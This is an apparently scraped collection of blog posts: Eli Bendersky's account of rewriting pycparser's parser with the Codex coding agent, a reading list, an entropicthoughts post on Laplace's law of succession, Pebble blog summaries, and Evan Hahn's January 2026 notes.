seriously. Over time, I grew convinced that recursive descent is the way to go - producing parsers that are easier to understand and maintain (and are often faster!).</p> <p>It all ties in to the benefits of dependencies in software projects as a function of effort. Using parser generators is a heavy conceptual dependency: it's really nice when you have to churn out many parsers for small languages. But when you have to maintain a single, very complex parser, as part of a large project - the benefits quickly dissipate and you're left with a substantial dependency that you constantly grapple with.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-other-issue-with-dependencies","title":"The other issue with dependencies","text":"<p>And then there are the usual problems with dependencies; dependencies get abandoned, and they may also develop security issues. Sometimes, both of these become true.</p> <p>Many years ago, pycparser forked and started vendoring its own version of PLY. This was part of transitioning pycparser to a dual Python 2/3 code base when PLY was slower to adapt. I believe this was the right decision, since PLY \"just worked\" and I didn't have to deal with active (and very tedious in the Python ecosystem, where packaging tools are replaced faster than dirty socks) dependency management.</p> <p>A couple of weeks ago this issue was opened for pycparser. It turns out the some old PLY code triggers security checks used by some Linux distributions; while this code was fixed in a later commit of PLY, PLY itself was apparently abandoned and archived in late 2025. And guess what? That happened in the middle of a large rewrite of the package, so re-vendoring the pre-archiving commit seemed like a risky proposition.</p> <p>On the issue it was suggested that \"hopefully the dependent packages move on to a non-abandoned parser or implement their own\"; I originally laughed this idea off, but then it got me thinking... which is what this post is all about.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#growing-complexity-of-parsing-a-messy-language","title":"Growing complexity of parsing a messy language","text":"<p>The original K&amp;R2 grammar for C99 had - famously - a single shift-reduce conflict having to do with dangling <code>else</code>s belonging to the most recent <code>if</code> statement. And indeed, other than the famous lexer hack used to deal with C's type name / ID ambiguity, pycparser only had this single shift-reduce conflict.</p> <p>But things got more complicated. Over the years, features were added that weren't strictly in the standard but were supported by all the industrial compilers. The more advanced C11 and C23 standards weren't beholden to the promises of conflict-free YACC parsing (since almost no industrial-strength compilers use YACC at this point), so all caution went out of the window.</p> <p>The latest (PLY-based) release of pycparser has many reduce-reduce conflicts [2]; these are a severe maintenance hazard because it means the parsing rules essentially have to be tie-broken by order of appearance in the code. This is very brittle; pycparser has only managed to maintain its stability and quality through its comprehensive test suite. Over time, it became harder and harder to extend, because YACC parsing rules have all kinds of spooky-action-at-a-distance effects. The straw that broke the camel's back was this PR which again proposed to increase the number of reduce-reduce conflicts [3].</p> <p>This - again - prompted me to think \"what if I just dump YACC and switch to a hand-written recursive descent parser\", and here we are.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-mental-roadblock","title":"The mental roadblock","text":"<p>None of the challenges described above are new; I've been pondering them for many years now, and yet biting the bullet and rewriting the parser didn't feel like something I'd like to get into. By my private estimates it'd take at least a week of deep heads-down work to port the gritty 2000 lines of YACC grammar rules to a recursive descent parser [4]. Moreover, it wouldn't be a particularly fun project either - I didn't feel like I'd learn much new and my interests have shifted away from this project. In short, the Potential well was just too deep.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#why-would-this-even-work-tests","title":"Why would this even work? Tests","text":"<p>I've definitely noticed the improvement in capabilities of LLM coding agents in the past few months, and many reputable people online rave about using them for increasingly larger projects. That said, would an LLM agent really be able to accomplish such a complex project on its own? This isn't just a toy, it's thousands of lines of dense parsing code.</p> <p>What gave me hope is the concept of conformance suites mentioned by Simon Willison. Agents seem to do well when there's a very clear and rigid goal function - such as a large, high-coverage conformance test suite.</p> <p>And pycparser has an very extensive one. Over 2500 lines of test code parsing various C snippets to ASTs with expected results, grown over a decade and a half of real issues and bugs reported by users.</p> <p>I figured the LLM can either succeed or fail and throw its hands up in despair, but it's quite unlikely to produce a wrong port that would still pass all the tests. So I set it to run.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-initial-port","title":"The initial port","text":"<p>I fired up Codex in pycparser's repository, and wrote this prompt just to make sure it understands me and can run the tests:</p> <pre><code>This repository implements a Python parser producing an AST. It has a very\nextensive test suite; can you first verify you successfully run all the tests?\n(with python3 -m unittest discover, from the root dir)\n</code></pre> <p>Codex figured it out (I gave it the exact command, after all!); my next prompt was the real thing [5]:</p> <pre><code>pycparser uses the PLY library for its lexer and parser, and its own AST\npackage for the ASTs created by the parser. I want to explore replacing the\nParser component (leaving the Lexer alone for now) with a hand written\nrecursive descent parser that will pass all the same tests. Can you try that?\n</code></pre> <p>Here Codex went to work and churned for over an hour. Having never observed an agent work for nearly this long, I kind of assumed it went off the rails and will fail sooner or later. So I was rather surprised and skeptical when it eventually came back with:</p> <pre><code>Replaced the PLY parse path with a handwritten recursive\u2011descent parser while\nkeeping the existing lexer and AST helpers intact; CParser now points to the\nnew RD implementation, with the old PLY version preserved as PLYCParser in\npycparser/c_parser.py. The RD parser includes a token stream, declarator/type\nparsing, expression precedence handling, pragmas, and statement parsing to\nmatch the previous AST output and coordinate behavior.\n</code></pre> <p>It took me a while to poke around the code and run it until I was convinced - it had actually done it! It wrote a new recursive descent parser with only ancillary dependencies on PLY, and that parser passed the test suite. After a few more prompts, we've removed the ancillary dependencies and made the structure clearer. I hadn't looked too deeply into code quality at this point, but at least on the functional level - it succeeded. This was very impressive!</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#a-quick-note-on-reviews-and-branches","title":"A quick note on reviews and branches","text":"<p>A change like the one described above is impossible to code-review as one PR in any meaningful way; so I used a different strategy. Before embarking on this path, I created a new branch and once Codex finished the initial rewrite, I committed this change, knowing that I will review it in detail, piece-by-piece later on.</p> <p>Even though coding agents have their own notion of history and can \"revert\" certain changes, I felt much safer relying on Git. In the worst case if all of this goes south, I can nuke the branch and it's as if nothing ever happened. I was determined to only merge this branch onto <code>main</code> once I was fully satisfied with the code. In what follows, I had to <code>git reset</code> several times when I didn't like the direction in which Codex was going. In hindsight, doing this work in a branch was absolutely the right choice.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-long-tail-of-goofs","title":"The long tail of goofs","text":"<p>Once I've sufficiently convinced myself that the new parser is actually working, I used Codex to similarly rewrite the lexer and get rid of the PLY dependency entirely, deleting it from the repository. Then, I started looking more deeply into code quality - reading the code created by Codex and trying to wrap my head around it.</p> <p>And - oh my - this was quite the journey. Much has been written about the code produced by agents, and much of it seems to be true. Maybe it's a setting I'm missing (I'm not using my own custom <code>AGENTS.md</code> yet, for instance), but Codex seems to be that eager programmer that wants to get from A to B whatever the cost. Readability, minimalism and code clarity are very much secondary goals.</p> <p>Using <code>raise...except</code> for control flow? Yep. Abusing Python's weak typing (like having <code>None</code>, <code>false</code> and other values all mean different things for a given variable)? For sure. Spreading the logic of a complex function all over the place instead of putting all the key parts in a single switch statement? You bet.</p> <p>Moreover, the agent is hilariously lazy. More than once I had to convince it to do something it initially said is impossible, and even insisted again in follow-up messages. The anthropomorphization here is mildly concerning, to be honest. I could never imagine I would be writing something like the following to a computer, and yet - here we are: \"Remember how we moved X to Y before? You can do it again for Z, definitely. Just try\".</p> <p>My process was to see how I can instruct Codex to fix things, and intervene myself (by rewriting code) as little as possible. I've mostly succeeded in this, and did maybe 20% of the work myself.</p> <p>My branch grew dozens of commits, falling into roughly these categories:</p> <ol> <li>The code in X is too complex; why can't we do Y instead?</li> <li>The use of X is needlessly convoluted; change Y to Z, and T to V in all instances.</li> <li>The code in X is unclear; please add a detailed comment - with examples - to explain what it does.</li> </ol> <p>Interestingly, after doing (3), the agent was often more effective in giving the code a \"fresh look\" and succeeding in either (1) or (2).</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#the-end-result","title":"The end result","text":"<p>Eventually, after many hours spent in this process, I was reasonably pleased with the code. It's far from perfect, of course, but taking the essential complexities into account, it's something I could see myself maintaining (with or without the help of an agent). I'm sure I'll find more ways to improve it in the future, but I have a reasonable degree of confidence that this will be doable.</p> <p>It passes all the tests, so I've been able to release a new version (3.00) without major issues so far. The only issue I've discovered is that some of CFFI's tests are overly precise about the phrasing of errors reported by pycparser; this was an easy fix.</p> <p>The new parser is also faster, by about 30% based on my benchmarks! This is typical of recursive descent when compared with YACC-generated parsers, in my experience. After reviewing the initial rewrite of the lexer, I've spent a while instructing Codex on how to make it faster, and it worked reasonably well.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#followup-static-typing","title":"Followup - static typing","text":"<p>While working on this, it became quite obvious that static typing would make the process easier. LLM coding agents really benefit from closed loops with strict guardrails (e.g. a test suite to pass), and type-annotations act as such. For example, had pycparser already been type annotated, Codex would probably not have overloaded values to multiple types (like <code>None</code> vs. <code>False</code> vs. others).</p> <p>In a followup, I asked Codex to type-annotate pycparser (running checks using <code>ty</code>), and this was also a back-and-forth because the process exposed some issues that needed to be refactored. Time will tell, but hopefully it will make further changes in the project simpler for the agent.</p> <p>Based on this experience, I'd bet that coding agents will be somewhat more effective in strongly typed languages like Go, TypeScript and especially Rust.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#conclusions","title":"Conclusions","text":"<p>Overall, this project has been a really good experience, and I'm impressed with what modern LLM coding agents can do! While there's no reason to expect that progress in this domain will stop, even if it does - these are already very useful tools that can significantly improve programmer productivity.</p> <p>Could I have done this myself, without an agent's help? Sure. But it would have taken me much longer, assuming that I could even muster the will and concentration to engage in this project. I estimate it would take me at least a week of full-time work (so 30-40 hours) spread over who knows how long to accomplish. With Codex, I put in an order of magnitude less work into this (around 4-5 hours, I'd estimate) and I'm happy with the result.</p> <p>It was also fun. At least in one sense, my professional life can be described as the pursuit of focus, deep work and flow. It's not easy for me to get into this state, but when I do I'm highly productive and find it very enjoyable. Agents really help me here. When I know I need to write some code and it's hard to get started, asking an agent to write a prototype is a great catalyst for my motivation. Hence the meme at the beginning of the post.</p>"},{"location":"eli.thegreenplace.net/Rewriting%20pycparser%20with%20the%20help%20of%20an%20LLM_20260205/#does-code-quality-even-matter","title":"Does code quality even matter?","text":"<p>One can't avoid a nagging question - does the quality of the code produced by agents even matter? Clearly, the agents themselves can understand it (if not today's agent, then at least next year's). Why worry about future maintainability if the agent can maintain it? In other words, does it make sense to just go full vibe-coding?</p> <p>This is a fair question, and one I don't have an answer to. Right now, for projects I maintain and stand behind , it seems obvious to me that the code should be fully understandable and accepted by me, and the agent is just a tool helping me get to that state more efficiently. It's hard to say what the future holds here; it's going to interesting, for sure.</p> [1] pycparser has a fair number of direct dependents, but the majority of downloads comes through CFFI, which itself is a major building block for much of the Python ecosystem. [2] The table-building report says 177, but that's certainly an over-dramatization because it's common for a single conflict to manifest in several ways. --- --- [3] It didn't help the PR's case that it was almost certainly vibe coded. --- --- [4] There was also the lexer to consider, but this seemed like a much simpler job. My impression is that in the early days of computing, <code>lex</code> gained prominence because of strong regexp support which wasn't very common yet. These days, with excellent regexp libraries existing for pretty much every language, the added value of <code>lex</code> over a custom regexp-based lexer isn't very high. That said, it wouldn't make much sense to embark on a journey to rewrite just the lexer; the dependency on PLY would still remain, and besides, PLY's lexer and parser are designed to work well together. So it wouldn't help me much without tackling the parser beast. --- --- [5] I've decided to ask it to the port the parser first, leaving the lexer alone. This was to split the work into reasonable chunks. Besides, I figured that the parser is the hard job anyway - if it succeeds in that, the lexer should be easy. That assumption turned out to be correct. --- ---"},{"location":"eli.thegreenplace.net/Summary%20of%20reading-%20October%20-%20December%202025_20260205/","title":"Summary of reading: October - December 2025","text":"<p>\u6765\u6e90: https://eli.thegreenplace.net \u94fe\u63a5: https://eli.thegreenplace.net/2025/summary-of-reading-october-december-2025/ \u65e5\u671f: 2025-12-31T23:11:00-08:00</p> <ul> <li>\"The Origins of Political Order: From Prehuman Times to the French Revolution\" by Francis Fukuyama - while reading this book it occurred to me that domains of study like political sciense must be incredibly difficult and frustrating. Imagine trying to match a model onto a set of data; the model has thousands of parameters, but you only have dozens or a couple of hundred of data points. This is what political sciense is like; there's a huge number of parameters and variables, far more than actual historical examples. And moreover, the historical examples are vague and often based on very partial memory and sketchy records. So books like this most often just devolve to history. As a history book, this one isn't bad, but I found it hard to draw wide conclusions from the themes it presents.</li> <li>\"Exploding the Phone: The Untold Story of the Teenagers and Outlaws Who Hacked Ma Bell\" by Phil Lapsley - a detailed history of phone phreaking. While I wish it focused more on the technical details than on the legal escapades of well-known phreaks, it's still a good book that provides decent coverage of an important era in the history of computing.</li> <li>\"The Zone\" by Sergei Dovlatov - (read in Russian) a satirical novella about the life of a guard in a Soviet prison camp in the 1960s. I liked this book less than \"The Compromise\".</li> <li>\"The Joy of SET\" by McMahon and Gordon x3 - explores the various mathematical dimensions of the SET card game. It's surprising how much interesting math there is around the game! Combinatorics and probability sure, but also modular arithmetic, vectors, linear algebra and affine geometry. This is a fun book for fans of the game (and of math); it's well written and even contains exercises. Don't expect it to teach you to become better at playing SET though - that's really not its goal.</li> <li>\"Doom Guy: Life in First Person\" by John Romero - Romero's auto-biography, also read by himself in the Audible version. Very good book, gives another angle at id software and the seminal games they developed. \"Masters of Doom\" is one of my favorite books, and this one complements it very nicely.</li> <li>\"Buffett: The Making of an American Capitalist\" by Roger Lowenstein - a detailed biography of Warren Buffett. Great book, very informative and interesting; the only issue is that it was written in 1995, and doesn't mention the last 30 years. It would be interesting to read an up-to-date biography at some point.</li> <li>\"The Great Democracies: A History of the English Speaking Peoples, Volume IV\" by Winston Churchill - the final volume, covering the years 1815 - 1901. There's still focus on England, but also coverage of the American civil war, Australia, and some of Britain's colonial interests in Africa.</li> <li>\"Starburst and Luminary, an Apollo Memoir\" Don Eyles - the author worked on coding the landing programs for the lunar module of several Apollo missions as a young engineer in MIT. The book must be based on fairly detailed journals, because it contains an astonishing amount of detail (given that it was written 50 years after the events described). Pretty interesting insight into that era, all in all, though I didn't care much about the author's mixing in his love life into it. It's his book, of course, and he can write whatever he wants in it, but IMO it just dilutes the other great material and makes it generally less suitable for younger audiences.</li> <li>\"Stoner\" by John Williams - I have mixed feelings about this book, and they will probably take (at least) another read to resolve. On one hand, the writing is clearly masterful and \"mood-evoking\" in a way that only few authors managed to do for me. Character development is beautiful, and there are glimpses of the flow of learning described amazingly well w.r.t. Stoner's own work. On the other hand, the characters are also too extreme - almost caricatures, and not very well connected to each other. There are huge amounts of page real-estate allocated to certain topics that are barely mentioned later on; this happens again and again. Edith, in particular, is a very troubling character, and since Stoner is clearly presented as someone who is not a pushover when he wants to, his behavior is puzzling to me.</li> <li>\"The Magic Mountain\" by Thomas Mann. A young German college student arrives to a sanatorium in the Swiss Alps to visit his cousin who suffers from TB, and stays for years, chronicling the odd personas flowing through the establishment. There's always some risk with trying famous books from over 100 years ago, and in this case the risk materialized - I found this one to be tedious, rambling and outdated. It's not all bad; there are certainly good parts, funny parts and some timeless lessons about human nature. But on the balance, I didn't enjoy this book and the only reason I managed to actually finish it cover to cover is because of the audiobook format (which let me zone out at times while doing something else).</li> <li>\"Breaking Through: My Life in Science\" by Katalin Karik\u00f3 - an autobiography by the molecular biologist who contributed significantly to therapeutic uses of mRNA, including its use for the COVID-19 vaccine. Highly recommended.</li> </ul> <p>Re-reads:</p> <ul> <li>\"Thinking Fast and Slow\" by Daniel Kahneman - still a great book, though I did not enjoy the re-read as much as I'd thought I would.</li> <li>\"The Man Who Changed Everything\" by Basil Mahon</li> <li>\"Of mice and men\" by John Steinbeck</li> </ul>"},{"location":"entropicthoughts.com/","title":"entropicthoughts.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Laws of Succession 20260202</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"entropicthoughts.com/Laws%20of%20Succession_20260202/","title":"Laws of Succession","text":"<p>\u6765\u6e90: entropicthoughts.com \u53d1\u5e03\u65f6\u95f4: Tue, 03 Feb 2026 00:00:00 +0100 \u94fe\u63a5: https://entropicthoughts.com/laws-of-succession</p> <p>Rajiv Prabhakar presents us with a hypothetical : You and your friend are walking by a magic store and find a trick coin. You toss it 14 times and end up with 10 heads. Your friend thinks at least one of the next two tosses will end up tails, and is willing to offer you $10 in an even-money bet on it. Should you take him up? This is a fancy way of asking, Is the probability of two heads on the next two tosses greater than 50\u00a0%? Rajiv claims to look at this from a frequentist perspective, arriving at a 51\u00a0% probability, and then a Bayesian perspective, arriving at 48.5\u00a0%. Therein lies the puzzle: one says \u201ctake the bet!\u201d and the other says \u201cask for better odds!\u201d How can statistics betray us like that in our time of greatest need? Fortunately, it is based on flawed analysis. Laplace\u2019s law of succession The problem with that analysis is that a true frequentist is unable to answer the question we have asked. The question of the probability of the next two tosses doesn\u2019t even make sense from a frequentist perspective. This is why frequentists test hypotheses by performing contortionist tricks like asking, Assuming heads and tails are equally likely, what would be the likelihood of observing 10 heads in the next 14 tosses? and then comparing that likelihood to an arbitrary threshold. This is not a strawman position on frequentism \u2013 this is the very thing that plagued the father of frequentism, Ronald Fisher, for all his life. Frequentists can, of course, answer a trivial questions like What was the probability of heads in the past 14 tosses? and it is tempting to extrapolate the answer to that straight into the future, but again, that would not be a valid operation according to a frequentist . Frequentists cannot assign probabilities to future events, they can only compare probabilities of past events. Now, not all is lost. There\u2019s a neat trick that blends faux frequentism with Bayesian reasoning. If our prior probability is uniformly distributed, we can update it with Laplace\u2019s rule of succession , which tells us to imagine there have been two more trials, one of which was successful. Then the ratio corresponds to the Bayesian posterior. In this case, that means imagining there were 11 heads in 16 tosses. The new ratio is (\\frac{11}{16}) and the posterior probability of two heads would then be (\\left(\\frac{11}{16}\\right)^2 \\approx 0.47). This is much easier and gives almost the same result as the actual Bayesian calculation, and the computer approximation. 1 1 Why is this a slightly different number than the actual value of 48.6\u00a0%? Because we have converted the posterior distribution to a point estimation, and then squared the point estimation. Jensen\u2019s inequality tells us we will arrive at a lower number that way than if we first square the posterior distribution and then make a point estimation. This is a law of succession most forecasters are familiar with: add one success and one failure to get the Bayesian posterior of coin flips. It\u2019s called Laplace\u2019s law of succession. Agresti\u2013Coull confidence intervals Here, have a pair of frequentist goggles; I want to take away your ability to estimate probabilities of future events again. Even as frequentists, we can still perform a standard hypothesis test to figure out whether we should believe the coin is biased at all. For this we need a 95\u00a0% confidence interval around the bias. The quick way to whip one of those up is to first pretend there were four more trials: two successes and two failures. Then we compute the size of two standard errors the normal way: [\\hat{p} = \\frac{10+2}{14+4} \\approx 0.67] [2\\hat{se} = 2\\sqrt{\\frac{\\hat{p}\\left(1 - \\hat{p}\\right)}{14+4}} \\approx 0.22] This gives us a confidence interval of 45\u00a0%\u201389\u00a0% for the bias. Since that includes 50\u00a0%, our null hypotheses, we cannot reject the null hypothesis and have to contend with the fact that the coin might not be biased at all. This is probably a reason not to take the bet. See, Rajiv, frequentists are not so dumb after all! This procedure is called an Agresti\u2013Coull confidence interval, and it\u2019s an approximation that\u2019s very close to an actual confidence interval. The drawback is that this simple version only lets us create two-sided 95\u00a0% confidence intervals. The paper by Agresti and Coull contains the details to construct other confidence intervals, but it gets a little more arithmetically complicated. Poisson-based law of succession Imagine now someone tosses the coin once a week, and in the past year, it has landed on heads four times. What\u2019s the probability it lands on tails next week? We can use what we already know here. There have been 52 trials and 4 heads, so that\u2019s a posterior of 5\u29f854\u22480.093 for heads. The inverse of this is the probability that it does not land on heads in any given week: 90.7\u00a0%. What if we had misheard, and the coin was actually tossed every day? This makes the coin extremely biased. It has been tossed for 365 days and only landed heads four times! 2 2 A calendar year actually has 365.2425 days, but here we use \u201cyear\u201d to mean \u201cthe past 365 days\u201d. By the same approach, we have the posterior 5\u29f8367\u22480.014. On the other hand, during the next week, it will have more opportunities to come up heads as well. To get the weekly probability of no heads, we have to take the inverse of the posterior and raise it to the power of 7. We get 90.8\u00a0%. Oh but wait, I meant to say it is flipped every minute, not every day! Assuming there are 525600-something minutes per year, we get a weekly probability of heads of 90.9\u00a0%. The general trend starts to show: when we pick finer subdivisions of time, the probability goes up, because we get more certain about our estimation. The posterior is more and more getting shaped by the data rather than the uniform prior. We could compute the probability if the coin was flipped every second, every millisecond, etc. But we won\u2019t, because there\u2019s a limit this tends to: [\\left(1 + \\frac{t}{T}\\right)^{-(S + 1)}] Here, (t) is the future timespan we are interested in, (T) is the timespan in the past we have observed for, and (S) are the number of successes observed in that timespan. Unlike in the previous Laplace case, the units of the timespans do not matter here, because they cancel out. With our coin, taking weeks as the natural unit: [\\left(1 + \\frac{1}{52}\\right)^{-(4 + 1)} \\approx 0.909] This is the probability that a continuously flipped coin shows heads any time during next week, if it has done so four times in the past year. This is nearly the same probability as when we computed Laplace\u2019s law of succession using minutes as the time increment, and this will be the case more generally. If we pick a time increment that is small compared to the future period we\u2019re interested in, Laplace\u2019s law of succession will give an answer very close to this limit. The benefit of knowing how to compute the limit is that we can use more convenient units of time when doing so. For more examples of this continuous limit, see the LessWrong article that introduces it . Key points We don\u2019t really have to learn the continuous limit. If we\u2019re fine with arithmetic using big numbers, we can use the plain Laplace rule even for continuous processes, as long as we pick a subdivision of time that is small enough. What needs to be remembered is that with (s) successes in (n) trials, the posterior probability is [\\frac{s+1}{n+2}.] But also, if we want a 95\u00a0% confidence interval, we compute [\\hat{p} = \\frac{s+2}{n+4}] and [2\\hat{se} = 2\\sqrt{\\frac{\\hat{p}(1-\\hat{p})}{n+4}}] and then the interval is [\\left(\\hat{p}-2\\hat{se}, \\hat{p}+2\\hat{se}\\right)] It is easy to get these two methods confused, because they both add virtual successes and failures. Try not to!</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:00</p>"},{"location":"ericmigi.com/","title":"ericmigi.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"ericmigi.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"ericmigi.com/#1-on-being-a-canadian-in-america-in-2026","title":"1. On Being A Canadian In America In 2026","text":"<p>\u94fe\u63a5: https://ericmigi.com/blog/on-being-a-canadian-in-america-in-2026</p> <p>\u65e5\u671f: Sun, 25 Jan 2026 00:00:00 GMT</p> <p>\u6458\u8981: An Evening Out Colette Berends (I wrote a draft of post in early 2025. I picked it up and decided to publish it today, hence why it is more\u2026</p>"},{"location":"ericmigi.com/#2-pebble-round-2-the-most-stylish-pebble-ever","title":"2. Pebble Round 2 - The Most Stylish Pebble Ever","text":"<p>\u94fe\u63a5: https://repebble.com/blog/pebble-round-2-the-most-stylish-pebble-ever</p> <p>\u65e5\u671f: Fri, 02 Jan 2026 00:00:00 GMT</p> <p>\u6458\u8981: We\u2019ve finally gotten around to it The entire Pebble relaunch would not be complete without revisiting one of our most iconic watches from\u2026</p>"},{"location":"ericmigi.com/#3-pebble-relaunch-year-one-done","title":"3. Pebble Relaunch - Year One Done!","text":"<p>\u94fe\u63a5: https://ericmigi.com/blog/pebble-relaunch-year-one-done</p> <p>\u65e5\u671f: Wed, 31 Dec 2025 00:00:00 GMT</p> <p>\u6458\u8981: Thanks for sharing your pics on Twitter, Ben, Antonio, 1987haaa, Sterling and Tom! Thank you, Pebble community! I can\u2019t believe it\u2019s only\u2026</p>"},{"location":"ericmigi.com/#4-meet-pebble-index-01-external-memory-for-your-brain","title":"4. Meet Pebble Index 01 - External Memory For Your Brain","text":"<p>\u94fe\u63a5: https://repebble.com/blog/meet-pebble-index-01-external-memory-for-your-brain</p> <p>\u65e5\u671f: Tue, 09 Dec 2025 00:00:00 GMT</p> <p>\u6458\u8981: Catch your best ideas before they slip through your fingers Do you ever have flashes of insight or an idea worth remembering? This happens\u2026</p>"},{"location":"ericmigi.com/#5-pebble-watch-software-is-now-100-open-source-tick-talk-4-pt2-demos","title":"5. Pebble Watch Software Is Now 100% Open Source + Tick Talk #4 - PT2 Demos!","text":"<p>\u94fe\u63a5: https://ericmigi.com/blog/pebble-watch-software-is-now-100percent-open-source</p> <p>\u65e5\u671f: Mon, 24 Nov 2025 00:00:00 GMT</p> <p>\u6458\u8981: Another big Pebble update today! TLDR: Yesterday, Pebble watch software was ~95% open source. Today, it\u2019s 100% open source. You can\u2026</p>"},{"location":"ericmigi.com/01_On_Being_A_Canadian_In_America_In_2026/","title":"On Being A Canadian In America In 2026","text":"<p>\u539f\u6587\u94fe\u63a5: https://ericmigi.com/blog/on-being-a-canadian-in-america-in-2026 \u53d1\u5e03\u65e5\u671f: Sun, 25 Jan 2026 00:00:00 GMT</p> <p>An Evening Out Colette Berends (I wrote a draft of post in early 2025. I picked it up and decided to publish it today, hence why it is more\u2026</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"ericmigi.com/02_Pebble_Round_2_-_The_Most_Stylish_Pebble_Ever/","title":"Pebble Round 2 - The Most Stylish Pebble Ever","text":"<p>\u539f\u6587\u94fe\u63a5: https://repebble.com/blog/pebble-round-2-the-most-stylish-pebble-ever \u53d1\u5e03\u65e5\u671f: Fri, 02 Jan 2026 00:00:00 GMT</p> <p>We\u2019ve finally gotten around to it The entire Pebble relaunch would not be complete without revisiting one of our most iconic watches from\u2026</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"ericmigi.com/03_Pebble_Relaunch_-_Year_One_Done_/","title":"Pebble Relaunch - Year One Done!","text":"<p>\u539f\u6587\u94fe\u63a5: https://ericmigi.com/blog/pebble-relaunch-year-one-done \u53d1\u5e03\u65e5\u671f: Wed, 31 Dec 2025 00:00:00 GMT</p> <p>Thanks for sharing your pics on Twitter, Ben, Antonio, 1987haaa, Sterling and Tom! Thank you, Pebble community! I can\u2019t believe it\u2019s only\u2026</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"ericmigi.com/04_Meet_Pebble_Index_01_-_External_Memory_For_Your_Br/","title":"Meet Pebble Index 01 - External Memory For Your Brain","text":"<p>\u539f\u6587\u94fe\u63a5: https://repebble.com/blog/meet-pebble-index-01-external-memory-for-your-brain \u53d1\u5e03\u65e5\u671f: Tue, 09 Dec 2025 00:00:00 GMT</p> <p>Catch your best ideas before they slip through your fingers Do you ever have flashes of insight or an idea worth remembering? This happens\u2026</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"ericmigi.com/05_Pebble_Watch_Software_Is_Now_100__Open_Source___Ti/","title":"Pebble Watch Software Is Now 100% Open Source + Tick Talk #4 - PT2 Demos!","text":"<p>\u539f\u6587\u94fe\u63a5: https://ericmigi.com/blog/pebble-watch-software-is-now-100percent-open-source \u53d1\u5e03\u65e5\u671f: Mon, 24 Nov 2025 00:00:00 GMT</p> <p>Another big Pebble update today! TLDR: Yesterday, Pebble watch software was ~95% open source. Today, it\u2019s 100% open source. You can\u2026</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"evanhahn.com/","title":"evanhahn.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Notes from January 2026 20260131</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"evanhahn.com/Notes%20from%20January%202026_20260131/","title":"Notes from January 2026","text":"<p>\u6765\u6e90: evanhahn.com \u53d1\u5e03\u65f6\u95f4: Sat, 31 Jan 2026 00:00:00 +0000 \u94fe\u63a5: https://evanhahn.com/notes-from-january-2026/</p> <p>Happy new year! Here are some of my notes from the first month of 2026.</p>"},{"location":"evanhahn.com/Notes%20from%20January%202026_20260131/#new-job-at-ghost","title":"New job at Ghost!","text":"<p>I started a new job as a Staff Engineer at Ghost this month. According to our homepage, Ghost is \u201cfor professional publishers to create, share, and grow a business around their content.\u201d I\u2019m looking forward to building software for independent journalists.</p> <p>This is also the third time in a row I\u2019ve chosen to work for a nonprofit. It\u2019s a pattern now: nonprofits are my default choice of where to work.</p>"},{"location":"evanhahn.com/Notes%20from%20January%202026_20260131/#things-i-did","title":"Things I did","text":"<ul> <li> <p>libdeflate does \u201cfast, whole-buffer DEFLATE-based compression and decompression\u201d. I published libdeflate.js, which wraps it up for JavaScript users. Always feels good to use a little WebAssembly.</p> </li> <li> <p>I recently set every single option in my Vim configuration, and blogged about it in \u201cI set all 376 Vim options and I\u2019m still a fool\u201d. Even though I learned a lot setting every flag, I still feel far from mastering an editor I\u2019ve used for almost 14 years. There was some good discussion on Lobsters, Reddit, and Hacker News.</p> </li> <li> <p>While everyone else is using state-of-the-art chatbots, I\u2019m using an LLM that\u2019s 7500 times stupider.</p> </li> <li> <p>I read On Writing Well by William Zinsser and published my notes. Zinsser\u2019s writing isn\u2019t to my taste, but I still learned a lot from this book.</p> </li> <li> 